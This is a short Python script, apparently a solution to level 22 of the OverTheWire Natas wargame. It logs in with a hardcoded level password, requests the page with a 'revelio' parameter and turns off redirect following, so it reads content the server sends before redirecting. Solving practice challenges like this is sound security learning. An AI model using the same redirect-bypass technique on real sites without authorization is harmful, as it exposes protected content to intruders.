import requests

# Constants
username = 'natas22'
password = '91awVM9oDiUGm33JdzM7RVLBS8bz9n0s'

url = f"http://{username}.natas.labs.overthewire.org/?revelio=1"

session = requests.session()
response = session.get(url, auth=(username, password), allow_redirects=False)
print(response.text)
